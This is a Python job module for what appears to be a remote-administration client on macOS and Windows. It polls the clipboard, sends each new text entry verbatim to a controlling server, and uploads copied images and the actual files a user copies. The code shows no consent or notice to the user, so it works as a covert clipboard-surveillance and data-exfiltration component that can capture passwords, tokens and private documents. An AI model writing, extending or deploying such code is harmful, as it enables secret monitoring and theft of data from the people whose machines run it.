JOB_METADATA = {
    "name": "clipboard_monitor",
    "display_name": "Clipboard Monitor",
    "description": "Monitor clipboard text, files, and optional images",
    "platforms": ["darwin", "windows"],
    "params": [
        {
            "name": "interval_seconds",
            "type": "integer",
            "required": False,
            "default": 3,
            "min": 1,
            "description": "Polling interval in seconds"
        },
        {
            "name": "transfer_images",
            "type": "boolean",
            "required": False,
            "default": True,
            "description": "Upload clipboard images when available"
        }
    ],
    "execution": {
    "default": "inproc",
    "allowed": ["subprocess", "inproc"]
}
}

import hashlib
import io
import os
import sys
import threading
import time

from client.jobs.core.job import Job
from core.utils.formatting import get_size, get_time
from core.utils.logger import logger


class ClipboardMonitor(Job):
    def __init__(self):
        super().__init__()
        self.recent_text = None
        self.image_hash = None
        self.file_list = None
        self.transfer_images = True
        self.interval = 3

    def on_context_bound(self):
        self.interval = int(self.get_job_param('interval_seconds', 3) or 3)
        self.transfer_images = bool(self.get_job_param('transfer_images', True))

    def run(self):
        try:
            time.sleep(2)
            import pyperclip
            self.send_to_server(1, 'Dependency loaded: pyperclip', 0)

            self.mark_running()
            self.send_to_server(1, 'Clipboard monitor started', 0)

            if self.transfer_images:
                from PIL import Image

                if sys.platform == 'darwin':
                    from client.clipboard.adapters.macos import MacOSClipboardAdapter
                    clipboard_adapter = MacOSClipboardAdapter()
                elif sys.platform == 'win32':
                    from client.clipboard.adapters.windows import WindowsClipboardAdapter
                    clipboard_adapter = WindowsClipboardAdapter()
                else:
                    clipboard_adapter = None

                self.send_to_server(1, 'Dependency loaded: pillow', 0)

                while not self.stop_event.is_set():
                    # 复用 Client clipboard adapter，保证文件优先于图片 representation。
                    snapshot = (
                        clipboard_adapter.get_snapshot()
                        if clipboard_adapter
                        else {'kind': 'empty'}
                    )
                    kind = str(snapshot.get('kind') or 'empty').strip().lower()

                    if kind == 'files':
                        self._handle_file_change(snapshot.get('paths') or [])

                    elif kind == 'image':
                        image_data = snapshot.get('data') or b''
                        if image_data:
                            with Image.open(io.BytesIO(image_data)) as image:
                                image.load()
                                self._handle_image_change(image)

                    elif kind == 'text':
                        self._handle_text_change(
                            str(snapshot.get('text') or '')
                        )

                    elif kind != 'empty':
                        self.send_to_server(
                            0,
                            f'Unsupported clipboard content type: {kind}',
                            0
                        )

                    time.sleep(self.interval)

            else:
                while not self.stop_event.is_set():
                    clipboard_text = pyperclip.paste()
                    self._handle_text_change(clipboard_text)
                    time.sleep(self.interval)

            self.send_to_server(1, 'Clipboard monitor stopped', 0)

        except Exception as e:
            self.send_to_server(0, f'Clipboard monitor error: {e}', 0)

        finally:
            self.mark_stopped()
            logger.info(
                f'Thread ended: {threading.current_thread().name}'
            )
            self.send_to_server(
                1,
                f'Task ended: {threading.current_thread().name}',
                1
            )

    def stop(self, notify: bool = True):
        self.request_stop(notify=notify)

    def _handle_text_change(self, text: str):
        if text and text != self.recent_text:
            self.recent_text = text
            self.send_to_server(
                1,
                f'Clipboard text changed: {text}',
                0
            )

    def _handle_image_change(self, image):
        image_hash = hashlib.sha256(
            image.tobytes()
        ).hexdigest()

        if image_hash != self.image_hash:
            self.image_hash = image_hash

            file_name = f'clipboard_image_{get_time()}.png'

            try:
                image.save(file_name, 'PNG')
                file_size = os.path.getsize(file_name)

                self.send_to_server(
                    1,
                    (
                        f'Clipboard image detected, uploading: '
                        f'{file_name} ({get_size(file_size)})'
                    ),
                    0
                )

                try:
                    self.upload_file_via_http(
                        file_name,
                        'clipboard_image'
                    )
                    self.send_to_server(
                        1,
                        (
                            f'Clipboard image uploaded successfully: '
                            f'{file_name}'
                        ),
                        0
                    )

                finally:
                    try:
                        os.remove(file_name)
                    except Exception as e:
                        self.send_to_server(
                            0,
                            (
                                'Failed to remove temporary '
                                f'clipboard_image: {e}'
                            ),
                            0
                        )

            except Exception as e:
                self.send_to_server(
                    0,
                    f'Failed to save clipboard image: {e}',
                    0
                )

    def _handle_file_change(self, files):
        file_list = ', '.join(files)

        if file_list != self.file_list:
            self.file_list = file_list

            self.send_to_server(
                1,
                f'Clipboard file list changed: {self.file_list}',
                0
            )

            for file_path in files:
                if not os.path.exists(file_path):
                    self.send_to_server(
                        0,
                        f'Clipboard file no longer exists: {file_path}',
                        0
                    )
                    continue

                if os.path.isdir(file_path):
                    self.send_to_server(
                        0,
                        f'Clipboard directory skipped: {file_path}',
                        0
                    )
                    continue

                try:
                    file_size = os.path.getsize(file_path)
                    file_name = os.path.basename(file_path)

                    self.send_to_server(
                        1,
                        (
                            f'Clipboard file detected, uploading: '
                            f'{file_name} ({get_size(file_size)})'
                        ),
                        0
                    )

                    self.upload_file_via_http(
                        file_path,
                        'clipboard_file'
                    )

                    self.send_to_server(
                        1,
                        (
                            f'Clipboard file uploaded successfully: '
                            f'{file_name}'
                        ),
                        0
                    )

                except Exception as e:
                    self.send_to_server(
                        0,
                        (
                            f'Failed to upload clipboard file '
                            f'{file_path}: {e}'
                        ),
                        0
                    )